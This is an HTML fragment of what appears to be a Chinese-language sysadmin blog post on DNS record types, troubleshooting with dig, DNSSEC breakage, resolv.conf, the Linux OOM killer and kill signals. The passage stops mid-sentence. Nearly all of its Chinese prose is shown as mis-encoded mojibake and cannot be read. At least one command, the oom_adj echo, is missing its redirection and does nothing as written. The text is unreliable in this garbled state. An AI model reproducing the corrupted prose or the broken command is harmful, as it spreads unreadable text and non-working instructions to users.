class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dig [domain] ns</span><br></pre></td></tr></table></figure></li><li>é€éä¸Šè¿°æŒ‡ä»¤ç¢ºèªç›®å‰NameServerè³‡æ–™æ˜¯å¦è·Ÿè¨»å†Šæ™‚å¡«å¯«ä¸€è‡´</li></ul></li><li>ç”šéº¼æ˜¯SOA Record?<ul><li>SOAç´€éŒ„æ˜¯<strong>ç¶²åŸŸåç¨±çš„ç³»çµ±ç®¡ç†ç´€éŒ„</strong></li><li>è‹¥ä½¿ç”¨ä»£ç®¡å‰‡ä¸éœ€è¦è™•ç†(CloudFlare, Gandi LiveDNS)</li><li>è‡ªæ¶çš„DNSä¸»æ©Ÿå‰‡æœƒéœ€è¦è¨­å®š</li><li>ä¸»è¦ä»£è¡¨è€…æœƒæ˜¯ç¶²åŸŸåç¨±çš„ç®¡ç†è€…ã€ç®¡ç†ä¸»æ©Ÿã€å€åŸŸæª”åºè™Ÿèˆ‡å…¨åŸŸæ€§çš„TTLè³‡æ–™</li></ul></li><li>ç”šéº¼æ˜¯A&#x2F;AAAAç´€éŒ„<ul><li>ç•¶è¦å°‡ç¶²åŸŸåç¨±å°æ‡‰åˆ°Serverçš„IPä½å€æ™‚ï¼Œå°±éœ€è¦ç”¨åˆ°Aç´€éŒ„</li><li>Aç´€éŒ„æŒ‡å‘åˆ°IPv4ä½å€</li><li>AAAAç´€éŒ„æŒ‡å‘åˆ°IPv6ä½å€  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ dig +short blog.rsync.tw a</span><br><span class="line">$ dig +short blog.rsync.tw aaaa</span><br></pre></td></tr></table></figure></li></ul></li><li>ç”šéº¼æ˜¯MXç´€éŒ„?<ul><li>é€™å€‹ç¶²åŸŸçš„mail serverç´€éŒ„</li><li>å¦‚æœæœ‰äººå¯„ä¿¡çµ¦ä½ ï¼Œéƒµä»¶ä¸»æ©Ÿæœƒå„ªå…ˆæŸ¥è©¢é€™å€‹ç¶²åŸŸåç¨±æœ‰æ²’æœ‰ MX ç´€éŒ„</li><li>å¦‚æœæœ‰ï¼Œå°±æœƒé€£ç·šåˆ°éƒµä»¶ä¸»æ©Ÿï¼Œå¦‚æœæ²’æœ‰ç‰¹åˆ¥è¨­å®š MX ç´€éŒ„</li><li>å¯„é€éƒµä»¶çš„ä¸»æ©Ÿæœƒå˜—è©¦è§£æç¶²åŸŸåç¨±çš„ A ç´€éŒ„</li><li>å¦‚æœæœ‰ A ç´€éŒ„ï¼Œå°±æœƒå˜—è©¦é€£ç·šä¸»æ©Ÿçš„éƒµä»¶ä¼ºæœå™¨ã€‚<br>  <img src="https://i.imgur.com/eQNw7LE.png"></li><li>ç•¶Domain Nameæœ‰MXç´€éŒ„ï¼Œmailä¸»æ©Ÿæœƒå˜—è©¦é€£ç·šmg.ntust.edu.tw</li><li>MXç´€éŒ„ä¸­å¯ä»¥è¨­å®šmail serverå„ªå…ˆé †åºï¼Œæ•¸å€¼è¶Šå°çš„å„ªå…ˆ</li><li>æ‰€ä»¥å¯„çµ¦ntust.edu.twçš„ä¿¡ï¼Œæœƒå„ªå…ˆé€çµ¦ mg.ntust.edu.tw</li><li>è‹¥æ²’æœ‰mxç´€éŒ„ï¼Œå‰‡æœƒé€çµ¦Domain Nameåç¨±çš„Aç´€éŒ„ï¼Œå³140.118.31.99<br>  <img src="https://i.imgur.com/rO5idoQ.png"></li></ul></li><li>ç”šéº¼æ˜¯CNAMEç´€éŒ„?<ul><li><strong>ä¸»æ©Ÿåç¨±çš„åˆ¥åçš„ä¸€ç¨®</strong>ï¼Œç•¶ä½ çš„ç›®çš„ä½å€æ˜¯ä¸»æ©Ÿåç¨±æ™‚ï¼Œè€Œä¸æ˜¯IPä½å€</li><li>é€™æ™‚å‰‡é ˆè¦ä½¿ç”¨CNAMEé€²è¡Œå°æ‡‰</li><li>é™åˆ¶: åŒä¸€ç­†ç´€éŒ„åº•ä¸‹å¦‚æœæœ‰è¨­å®šCNAMEç´€éŒ„ï¼Œå°±ä¸èƒ½è¨­å®šå…¶ä»–ç´€éŒ„<ul><li>ç‚ºç”šéº¼?</li></ul></li><li>EX. <strong>è‹¥è¨­å®šæŸå€‹domainçš„CNAMEï¼Œå‰‡ä¸å¯è¨­å®šAã€MXã€TXTç­‰ç´€éŒ„</strong></li></ul></li><li>è‹¥æœ‰äººè¨­å®šæŸå€‹Domain Nameçš„CNAMEï¼Œä¾‹å¦‚æˆ‘è¨»å†Š HelloWorld.tw ç„¶å¾Œæƒ³è¦æŠŠç¶²é ç€è¦½è€…é€£åˆ°è·Ÿblog.HelloWorld.twä¸€æ¨£çš„ç¶²ç«™ï¼Œæ‰€ä»¥è¨­å®šäº†  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HelloWorld.tw  CNAME  blog.HelloWorld.tw</span><br></pre></td></tr></table></figure><ul><li>ä½†HelloWorld.twä¸€å®šå¸¶æœ‰SOAèˆ‡NSç´€éŒ„ï¼Œæœƒè·ŸCNAMEç”¢ç”Ÿè¡çªï¼Œæœƒé€ æˆç¶²åŸŸåç¨±é‹ä½œä¸ç©©å®šï¼Œæ‰€ä»¥è‹¥è¦å®Œæˆä¸€æ¨£çš„åŠŸèƒ½å¯ä»¥é€éç¶²é è·³è½‰çš„æ–¹å¼ä¾†å®Œæˆ</li></ul></li><li>å¯ä»¥è¬›è§£ä¸€ä¸‹ <code>dig</code> æŒ‡ä»¤æ€éº¼ä½¿ç”¨å—?ç”šéº¼æƒ…æ³ä¸‹ä½ æœƒç”¨åˆ°é€™å€‹æŒ‡ä»¤?.<ul><li>æ˜¯ä¸€ç¨®DNSé™¤éŒ¯å·¥å…·ï¼Œèƒ½å¤ æ¨¡æ“¬ä¸€èˆ¬é›»è…¦æŸ¥è©¢ã€éè¿´æŸ¥è©¢ã€ééè¿´æŸ¥è©¢ã€DNS å¿«å–ä¼ºæœå™¨æŸ¥è©¢ã€DNSSEC æŸ¥è©¢ã€TCP æŸ¥è©¢ç­‰ç­‰ã€‚</li><li><code>dig</code> çš„å›æ‡‰å€æ®µ<br>  <img src="https://i.imgur.com/kHAra1e.png"><ul><li>Header<br>  <img src="https://i.imgur.com/nr5u3aS.png"><ul><li>ID: ç´”æ•¸å­—ï¼ŒDNSæŸ¥è©¢çš„è­˜åˆ¥ç¢¼</li><li>QR:0æŸ¥è©¢ 1 å›æ‡‰</li><li>Opcode: 0 QUERY,1 IQUERY, 2 STATUS</li><li>AA: æ¬Šå¨ä¼ºæœå™¨å›æ‡‰</li><li>TC: æˆªæ–·</li><li>RD: ç”¨æˆ¶ç«¯æ˜¯å¦è¦æ±‚éè¿´æŸ¥è©¢</li><li>RA: ä¼ºæœå™¨å›æ‡‰æ˜¯æ”¯æ´éè¿´æŸ¥è©¢</li><li>Z: ä¿ç•™</li><li>RCODE: 0æ²’æœ‰éŒ¯èª¤ã€1-5 éŒ¯èª¤ä»£ç¢¼</li><li>QDCOUNT: Questionå€æ®µçš„è³‡æ–™æ•¸é‡</li><li>ANCOUNT: Answerå€æ®µçš„è³‡æ–™æ•¸é‡</li><li>NSCOUNT: Authorityå€æ®µçš„è³‡æ–™æ•¸é‡</li><li>ARCOUNT: Additionalå€æ®µçš„è³‡æ–™æ•¸é‡</li></ul></li><li>Question</li><li>Answer</li><li>Authority</li><li>Additional</li></ul></li><li><code>dig</code>çš„åƒæ•¸<ul><li><code>@server</code> æŒ‡å®šä¼ºæœå™¨ï¼Œ<strong>å°å“ªå°Serverç™¼å‡ºDNSæŸ¥è©¢ï¼Œè‹¥ä¸æŒ‡å®šå‰‡ä½¿ç”¨ç³»çµ±é è¨­</strong></li><li><code>+short</code> ç°¡ç•¥è¼¸å‡ºï¼Œåªé¡¯ç¤ºANSWERéƒ¨åˆ†ï¼Œè‹¥æ²’å›æ‡‰å‰‡é¡¯ç¤ºç©ºç™½</li><li><code>-4</code> åªä½¿ç”¨ IPv4ä½å€é€²è¡Œèˆ‡Serverçš„é€£ç·š</li><li><code>-6</code> åªä½¿ç”¨ IPv6ä½å€é€²è¡Œèˆ‡Serverçš„é€£ç·š</li><li><code>+tcp</code> ä½¿ç”¨TCPçš„æ–¹å¼èˆ‡DNS Serveré€£ç·š<ul><li><strong>DNSåŸç”Ÿæ˜¯ä½¿ç”¨ UDP&#x2F;53 å”å®š</strong>ï¼Œè‹¥æœ‰äººå¿˜è¨˜é–‹å•Ÿä¸»æ©Ÿæˆ–IPåˆ†äº«å™¨çš„é˜²ç«ç‰†</li><li>å‰‡æœƒé€é <code>+tcp</code> çš„æ–¹å¼å°‡DNSæŸ¥è©¢æ”¹ç‚ºTCPé€£ç·š</li><li>è‹¥ä¸€èˆ¬æŸ¥è©¢æ²’å›æ‡‰ï¼Œè€Œ<code>+tcp</code>æœƒéï¼Œå‰‡ä»£è¡¨é˜²ç«ç‰†æ²’æœ‰é–‹å•Ÿ</li></ul></li><li><code>cdflag</code> ç”¨æ–¼é—œé–‰DNSSECæŸ¥è©¢<ul><li>DNSSECæ˜¯ä¸€ç¨®DNSçš„å»¶ä¼¸å®‰å…¨å”å®šï¼Œå¯ä»¥ç¢ºä¿DNSç´€éŒ„ç„¡æ³•è¢«å½é€ (é€éé›»å­ç°½ç« çš„æ–¹å¼)</li><li>è‹¥DNSSECç®¡ç†ä¸ç•¶å‰‡æœƒé€ æˆDNSSECé©—è­‰å¤±æ•—</li><li>æœƒç™¼ç”Ÿä¸ç©©å®šçš„DNSè§£æ</li><li>æ­¤æ™‚å¯ä»¥é€éæ­¤åƒæ•¸å°‡å…¶é—œé–‰</li><li>è‹¥ä¸€èˆ¬æŸ¥è©¢æ²’å›æ‡‰ï¼Œä½†+cdflagå¾Œæœ‰æ­£ç¢ºå›æ‡‰ï¼Œå‰‡ä»£è¡¨DNSSECå£æ‰</li></ul></li></ul></li><li>æŒ‡ä»¤ç¯„ä¾‹  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># æŸ¥è©¢å¿«å–Serverçš„Aç´€éŒ„</span><br><span class="line">$ dig @8.8.8.8 blog.rsync.tw. a</span><br><span class="line"># æŸ¥è©¢Domain Nameçš„MX</span><br><span class="line">$ dig rsync.tw mx</span><br><span class="line"># æŸ¥è©¢Domain Nameè² è²¬äºº</span><br><span class="line">$ dig rsync.tw soa</span><br><span class="line"># è¿½è¹¤æ¨¡å¼</span><br><span class="line">$ dig +trace blog.rsync.tw a</span><br><span class="line"># tcpæŸ¥è©¢æ¨¡å¼</span><br><span class="line">$ dig +tcp blog.rsync.tw a</span><br><span class="line"># æŸ¥è©¢IPåè§£  = nslookup &lt;IP&gt;</span><br><span class="line">$ dig -x 8.8.8.8 ptr</span><br><span class="line"># é—œé–‰DNSSECæŸ¥è©¢</span><br><span class="line">$ dig +cdflag @8.8.8.8 blog.rsync.tw a</span><br></pre></td></tr></table></figure></li></ul></li><li>DNS Troubleshooting<ul><li>step 1 : æŸ¥è©¢NSä½å€<ul><li>åœ¨ä½ ä½œ dig é™¤éŒ¯é–‹å§‹ä¹‹å‰ï¼Œé¦–å…ˆä½ è¦ç¢ºèªç¶²åŸŸåç¨±çš„åç¨±ä¼ºæœå™¨(NameServer) ä½å€ï¼Œå› ç‚ºæ‰€æœ‰å›æ‡‰éƒ½ä¸€å®šå¾åç¨±ä¼ºæœå™¨å›æ‡‰ï¼Œæ‰€æœ‰ä½¿ç”¨Domain Name Registryæˆ–æ˜¯Cloudfareä¹‹é¡çš„æœå‹™å‰‡NameServeræœƒæ˜¯é€™äº›æ¥­è€…ï¼Œä¹Ÿæœ‰æ˜¯è¨»å†Šæ™‚å¡«å¯«çš„NameServeræ¬„ä½è³‡æ–™  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dig +short rsync.tw ns</span><br></pre></td></tr></table></figure></li><li>å¯çœ‹å‡ºNameServeræ˜¯å“ªå¹¾å°(DNSç´€éŒ„ç”±å“ªå¹¾å°è² è²¬)</li><li>æˆ–æ˜¯ç”±æ·ºå…¥æ·±å¾è¼ƒé«˜å±¤çš„DNS ServeræŸ¥ä¸‹ä¾†  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dig +short tw ns</span><br></pre></td></tr></table></figure>  <img src="https://i.imgur.com/4t141yp.png">  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dig +short @a.dns.tw edu.tw ns</span><br></pre></td></tr></table></figure>  <img src="https://i.imgur.com/EZmwnTT.png">  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dig +short  @moestar.edu.tw [target domain name] ns</span><br></pre></td></tr></table></figure></li><li>ç‚ºä½•ä¸ç›´æ¥ dig +short ntust.edu.tw ?<br>  <img src="https://i.imgur.com/6miPWp1.png"><ul><li>å› ç‚ºé€™æ¨£æœƒé€éç³»çµ±Cache Serverå»æŸ¥è©¢DNS NSç´€éŒ„</li></ul></li></ul></li><li>å¯èƒ½ç™¼ç”Ÿçš„æƒ…æ³:<ul><li>ç©ºçš„ã€æ²’å›æ‡‰<ul><li>å¦‚æœä½ åœ¨æŸ¥è©¢ NS çš„æ™‚å€™å‡ºç¾éŒ¯èª¤ï¼Œæˆ–æ˜¯ç™¼ç¾æœ‰å›æ‡‰ï¼Œä½†æ˜¯æ²’æœ‰è³‡æ–™</li><li>å¯èƒ½æƒ…æ³-1: NameServerå¡«éŒ¯ï¼Œè«‹Domain Name Registryæª¢æŸ¥</li><li>å¯èƒ½æƒ…æ³-2: ç¶²é‡åˆ°æœŸæ²’ç¹³éŒ¢ï¼Œæˆ–ç‹€æ³æœ‰å•é¡Œ(é€é<code>Whois</code> æŒ‡ä»¤ä¾†æŸ¥çœ‹)</li></ul></li><li>NameServeræ˜¯Public DNS<ul><li>æœ‰äººæœƒæŠŠPublic DNSä»¥ç‚ºæ˜¯NameServerï¼Œå°±æŠŠ8.8.8.8å¡«å…¥nameserveré‚£é‚Šï¼Œä½†é€™æ¨£æ˜¯ä¸å°çš„</li></ul></li><li>è·Ÿä½ å¡«çš„è³‡æ–™ä¸åŒ<ul><li>Domain Name Registryæ²’æœ‰å°‡ä½ çš„åç¨±æ›´æ–°åˆ°åŸŸåç®¡ç†å±€æˆ–æ˜¯ä½ å‰›å¥½æ›´æ›NameServerä¸­</li></ul></li></ul></li><li>Step 2 : ç›´æ¥æŸ¥è©¢Name Serverçš„è³‡æ–™<ul><li>ç¢ºèªNSä½å€å¾Œï¼Œæ¥ä¸‹ä¾†å°Name Serveré€å‡ºæŸ¥è©¢</li><li>æŸ¥è©¢ä½ è¦è§£æçš„åŸŸåï¼Œç¨±ä¼ºæœå™¨å›æ‡‰çš„è³‡æ–™æ‡‰è©²æ˜¯æœ€æ–°ã€æœ€å®Œæ•´çš„ï¼Œæ‰€ä»¥ä½ è¦çŸ¥é“ç´€éŒ„æ›´æ–°äº†æ²’ã€è§£æåˆ°åº•æ­£ä¸æ­£ç¢ºï¼Œéƒ½æ˜¯é€éç›´æ¥æŸ¥è©¢åç¨±ä¼ºæœå™¨ä¾†ç²å¾—è§£ç­”ã€‚<br>  <img src="https://i.imgur.com/MHvHAb6.png"></li></ul></li><li>å¯èƒ½ç™¼ç”Ÿçš„å•é¡Œ-2:<ul><li>NameServeråŒæ­¥ä¸ä¸€è‡´<ul><li>ç¢ºä¿æ¯å°NameServerå›æ‡‰è³‡æ–™éƒ½æ˜¯æ­£ç¢ºçš„</li></ul></li><li>NameServerç„¡å›æ‡‰<ul><li>ä»£è¡¨NameServerçš„DNSæœå‹™æœ‰å•é¡Œ</li><li>å¯èƒ½DNSæœå‹™æ²’å•Ÿç”¨æˆ–æ©Ÿå™¨æœ‰å•é¡Œ</li><li>å¯ä»¥pingä¸€ä¸‹NameServerï¼Œå¦‚æœæœ‰å›æ‡‰å°±æ˜¯DNSæœå‹™çš„å•é¡Œ</li><li>å‰‡å¯é€é <code>dig +tcp</code>ä¾†æª¢æŸ¥æ˜¯ä¸æ˜¯é˜²ç«ç‰†çš„å•é¡Œ</li><li>è‹¥æœ‰å›æ‡‰å‰‡è¦æœå‘é˜²ç«ç‰†çš„å•é¡Œå»è§£æ±º  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#æŸ¥è©¢Name Serverå›æ‡‰ï¼Œå¯ä»¥æŸ¥è©¢SOAï¼Œå› ç‚ºä¸€å®šæœ‰é€™ç­†ç´€éŒ„</span><br><span class="line">$ dig @(NS IP) (domain) soa</span><br><span class="line">#å¦‚æœæ²’å›æ‡‰ï¼Œpingçœ‹çœ‹æ˜¯ä¸æ˜¯ä¸»æ©Ÿæˆ–ç¶²è·¯å•é¡Œ</span><br><span class="line">$ ping (NS IP)</span><br><span class="line"># å¦‚æœpingæœ‰å›æ‡‰ï¼Œå‰‡æ”¹ç”¨+tcp ä¾†æª¢æŸ¥æ˜¯ä¸æ˜¯é˜²ç«ç‰†å•é¡Œ</span><br><span class="line">$ dig +tcp @(NS IP) (domain) soa</span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li>Step 3 : æª¢æŸ¥Authority Serverå›ç­”<ul><li>nameserveré€šå¸¸æ˜¯ç”±ä¸Šå¾€ä¸‹æˆæ¬Š<ul><li>ex. rsync.tw nameserveræ˜¯ç”±.twå¾€ä¸‹æˆæ¬Šåˆ° ns[1-3].gandi.netçš„nameserverçš„</li></ul></li><li>æˆæ¬Šä¸ä¸€å®šæ­£ç¢º(å…¶å¯¦æ˜¯ä½¿ç”¨è€…è‡ªå·±å¡«çš„ï¼Œå¯èƒ½æœƒå¡«éŒ¯)ï¼Œä¸Šå±¤ä¾ç…§ä½¿ç”¨è€…è¼¸å…¥çš„è³‡æ–™ç›´æ¥è®ŠæˆNameServer</li><li>æ­£ç¢ºæˆæ¬Š:<ul><li><ol><li>ç”±ä¸Šå°ä¸‹æ­£ç¢ºæˆæ¬Š</li></ol></li><li><ol start="2"><li>ä¼ºæœå™¨å…·å‚™æ¬Šå¨ä¼ºæœå™¨çš„å›ç­”  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ dig @ns1.gandi.net rsync</span><br><span class="line"></span><br><span class="line"># response</span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.10.3-P4-Ubuntu &lt;&lt;&gt;&gt; @ns1.gandi.net rsync.tw a</span><br><span class="line">; (2 servers found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 45858</span><br><span class="line">;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="line">;; WARNING: recursion requested but not available</span><br><span class="line">...omit...</span><br></pre></td></tr></table></figure></li></ol></li></ul></li><li>ä¸ä½¿ç”¨ +short åƒæ•¸ï¼Œå°±å¯ä»¥çœ‹åˆ°Headeréƒ¨åˆ†ï¼Œå¯ä»¥çœ‹Headerä¸­çš„<strong>AA Flag</strong> </li><li>å›æ‡‰ä¸­ï¼Œæœ‰ä¸€å€‹ â€œflags: qr aa rd;â€ï¼Œaa &#x3D; AA å°±æ˜¯æ¬Šå¨ä¼ºæœå™¨å›ç­”çš„æ„æ€</li><li>ä»£è¡¨é€™å°ServerçŸ¥é“è‡ªå·±ç®¡ç†äº†æ­¤ç¶²åŸŸï¼Œæ‰€ä»¥å¾å€åŸŸæª”ä¸­çš„è³‡æ–™å›æ‡‰çµ¦æŸ¥è©¢ç«¯</li><li>å°Public DNSæŸ¥è©¢å‰‡ä¸æœƒæœ‰é€™å€‹AA Flag</li><li>è€Œè‹¥æ˜¯å°Name ServeræŸ¥è©¢è€Œæ²’æœ‰AAï¼Œå‰‡ä»£è¡¨ç®¡ç†å“¡æ²’æœ‰æ­£ç¢ºè¨­å®šServer</li></ul></li><li>Step 4 : æŸ¥è©¢Cache Server(Public DNS)<ul><li>æœ€å¾Œä¸€æ­¥å°±æ˜¯è¦æŸ¥è©¢å¿«å–ä¼ºæœå™¨çš„å›æ‡‰è³‡æ–™ï¼Œçœ‹çœ‹æ˜¯å¦æ­£ç¢ºï¼Œä¸€èˆ¬æ‰€æœ‰çš„ç”¨æˆ¶é›»è…¦éƒ½æœƒé€éå¿«å–ä¼ºæœå™¨ (è­¬å¦‚8.8.8.8ã€168.95.1.1) å–å¾— DNS çš„è³‡æ–™ï¼Œæ‰€ä»¥æˆ‘å€‘è¦æ¸¬è©¦ä¸€ä¸‹æ˜¯å¦æ­£ç¢ºï¼š  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dig @8.8.8.8 www.rsync.tw a</span><br></pre></td></tr></table></figure></li></ul></li><li>å¯èƒ½ç™¼ç”Ÿçš„å•é¡Œ-4<ul><li>æŸ¥è©¢åˆ°èˆŠè³‡æ–™<ul><li>DNS æœ‰TTLæš«å­˜æ™‚é–“</li><li>æš«å­˜æ™‚é–“å…§ï¼Œéƒ½æœƒä¿ç•™è³‡æ–™ç›´åˆ°TTL(ç§’)æ™‚é–“éå»</li><li>é€™æ™‚éœ€è¦ç¢ºèªæ¯å€‹Authority Serverçš„æŸ¥è©¢æ˜¯å¦éƒ½æ˜¯æœ€æ–°è³‡æ–™</li></ul></li><li>è§£æå¤±æ•ˆNXDOMAIN<ul><li>è‹¥ä¸Šè¿°æŸ¥è©¢éç¨‹ä¸­éƒ½æ²’å•é¡Œï¼Œä½†Public DNSé€™äº›å¿«å–Serverå»æ²’åæ‡‰</li><li>å¯èƒ½æ˜¯ DNSSECå£æ‰äº†</li><li>æ­¤æ™‚éœ€è¦æ‰¾ä½ çš„Domain Nameçš„è¨»å†Šå•†å»å–æ¶ˆä½ çš„DNSKEYé‡‘é‘°</li></ul></li></ul></li></ul></li><li>[DNSSECå£æ‰æœƒç™¼ç”Ÿç”šéº¼äº‹?è©²æ€éº¼ä¿®å¾©]<a href="https://haway.30cm.gg/dnssec-broken/">(https:&#x2F;&#x2F;</a>)?<ul><li>ç¾è±¡:<ul><li>å¯èƒ½å°±åªæœ‰é€éæˆæ¬Šçµ¦ä½ çš„domainçš„æ¬Šå¨DNS Serverèƒ½å¤ æŸ¥è©¢åˆ°ä½ çš„Aç´€éŒ„</li><li>ä½†ä½ å¦‚æœæŸ¥è©¢Public DNS Server(ex. 8.8.8.8)ä¸­Açš„ä½ çš„domainçš„Aç´€éŒ„å¯èƒ½è—‰æœƒå ±éŒ¯</li></ul></li><li>æª¢æŸ¥: <ul><li>é€™æ™‚å¯ä»¥é€é åŠ ä¸Š <code>+cdflag</code> åƒæ•¸ä¾†è®“DNS Cache Serveré—œé–‰DNSSECé©—è­‰</li><li><code>cdflag</code> å°±æ˜¯å‘Šè¨´8.8.8.8ï¼Œé€™å€‹DNSæŸ¥è©¢ä¸éœ€è¦é€²è¡ŒDNSSECé©—è­‰</li></ul></li><li>å¯èƒ½åŸå› :<ul><li>è‹¥ä½¿ç”¨äº†æŸå€‹åŸŸåä»£ç®¡æœå‹™ï¼Œä¸¦é–‹å•Ÿäº†DNSSEC</li><li>ä½†å¾ŒçºŒåˆå°‡Nameserverè®Šæ›´ï¼Œé€™å°‡æœƒå°è‡´DNSSEC Chain é©—è­‰å¤±æ•—</li><li>å› ç‚ºDNSKEYæ²’æœ‰è¢«ç§»è½‰(æ–°çš„Name Serverä¸­æ²’æœ‰DNSKEY)ï¼Œå‰‡æœƒå°è‡´é©—è­‰å¤±æ•—</li></ul></li><li>è§£æ±ºæ–¹å¼: <ul><li>æˆ–æ˜¯ä½¿ç”¨åŸŸåè¨»å†Šå•†æä¾›çš„ä»‹é¢ä¸¦é—œé–‰DNSSECçš„åŠŸèƒ½</li><li>æˆ–æ˜¯åœ¨æ–°çš„NameServerä¸Šé‡æ–°ç°½ç½²DNSSECï¼Œç„¶å¾Œæ›´æ–°DNSKEY</li></ul></li></ul></li><li>åœ¨LINUXä¸­å¦‚ä½•é–‹å•ŸDNSSEC?<ul><li>å¯ä¿®æ”¹ &#x2F;etc&#x2F;systemd&#x2F;resolv.confä¸­çš„DNSSECè¨­å®šå€¼</li></ul></li><li>åœ¨&#x2F;etc&#x2F;resolv.confä¸­è¨­å®šçš„nameserverè¢«é‡ç½®æ€éº¼è¾¦?<ul><li>é€é symbolic linkæŒ‡å‘ &#x2F;etc&#x2F;systemd&#x2F;resolv.conf  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ cd /etc</span><br><span class="line">$ rm resolv.conf</span><br><span class="line">$ ln -s /run/systemd/resolve/resolv.conf resolv.conf</span><br></pre></td></tr></table></figure></li><li>ç›´æ¥ä¿®æ”¹ &#x2F;etc&#x2F;systemd&#x2F;resolv.conf ä¸­çš„DNSä½å€</li></ul></li><li>ä½ æœƒå»æ€éº¼è™•ç†Linuxä¸­Processçš„OOMå•é¡Œ?</li><li>ç”šéº¼æ˜¯<strong>OOM Killer</strong>?<ul><li>Linuxä¸­è² è²¬ç›£æ§é‚£äº›å ç”¨memoryéå¤§ï¼Œå°¤å…¶æ˜¯ç¬é–“å¾ˆå¿«æ¶ˆè€—å¤§é‡memoryçš„process</li><li>ç‚ºäº†é˜²æ­¢memoryè€—ç›¡è€ŒkernelæœƒæŠŠè©²process killæ‰</li><li>æœ‰æ™‚å€™SSHä¸åˆ°æ©Ÿå™¨ï¼Œä½†èƒ½ ping é€šï¼Œèªªæ˜ä¸æ˜¯ç¶²çµ¡çš„æ•…éšœï¼Œå¾ˆå¤šåŸå› æ˜¯ sshd processè¢« OOM killer æ®ºæ‰äº†</li><li>Kernelæœƒé€šéç‰¹å®šçš„æ¼”ç®—æ³•çµ¦æ¯å€‹processè¨ˆç®—ä¸€å€‹åˆ†æ•¸ä¾†æ±ºå®šæ®ºå“ªå€‹process</li><li>æ¯å€‹processçš„ OOM åˆ†æ•¸å¯ä»¥åœ¨ã€Œ**&#x2F;proc&#x2F;PID&#x2F;oom_score**ã€ä¸­æ‰¾åˆ°</li><li>é‡å•Ÿæ©Ÿå™¨å¾ŒæŸ¥çœ‹ç³»çµ±æ—¥èªŒã€Œ**&#x2F;var&#x2F;log&#x2F;messages**ã€æœƒç™¼ç¾ã€ŒOut of Memory: Kill process 1865ï¼ˆsshdï¼‰ã€é¡ä¼¼çš„éŒ¯èª¤è¨Šæ¯</li><li><code>echo -17 /proc/PID/oom_adj</code> ä¾†è§£æ±ºé€™å€‹å•é¡Œ<ul><li>å¯èª¿ç¯„åœ: 15~ -16</li><li>-17æ˜¯ç¦ç”¨</li></ul></li><li>æˆ–æ˜¯ä¿®æ”¹Kernelåƒæ•¸:  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w vm.panic_on_oom=1 (é è¨­ç‚º0)</span><br><span class="line">sysctl -p</span><br></pre></td></tr></table></figure></li></ul></li><li><code>kill -9</code> èˆ‡ <code>kill -15</code> å·®åˆ¥åœ¨å“ª?é€çš„signalæ˜¯ç”šéº¼?  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ kill PID</span><br><span class="line"># è¨Šè™Ÿ: SIGKILL</span><br><span class="line">$ kill -9 PID //ç«‹å³å¼·åˆ¶åœæ­¢ç¨‹å¼åŸ·è¡Œ</span><br><span class="line"># è¨Šè™Ÿ: SIGTERM</span><br><span class="line">$ kill -15 PID //ä»¥æ­£å¸¸ç¨‹åºé€šçŸ¥ç¨‹å¼åœæ­¢åŸ·è¡Œï¼Œé è¨­çš„è¨Šè™Ÿ</span><br><span class="line">$ kill -l åˆ—å‡ºæ‰€æœ‰å¯ç”¨è¨Šè™Ÿ</span><br><span class="line"></span><br></pre></td></tr></table></figure>  <img src="https://i.imgur.com/1INBiak.png"></li><li>æ€éº¼æŸ¥è©¢killæŒ‡ä»¤ä¸­å“ªå€‹è¨Šè™Ÿå°æ‡‰ç”šéº¼æ•¸å­—<ul><li><code>$ kill -l &lt;æ•¸å­—&gt;</code></li></ul></li><li>å¯ä»¥è§£é‡‹ä¸€ä¸‹ <code>ss</code>æŒ‡ä»¤çš„ä½¿ç”¨æ™‚æ©Ÿå—?<ul><li>å¯ä»¥è¼¸å‡ºæ‰€æœ‰å·²ç¶“å»ºç«‹çš„ TCP é€£ç·š</li><li>ss 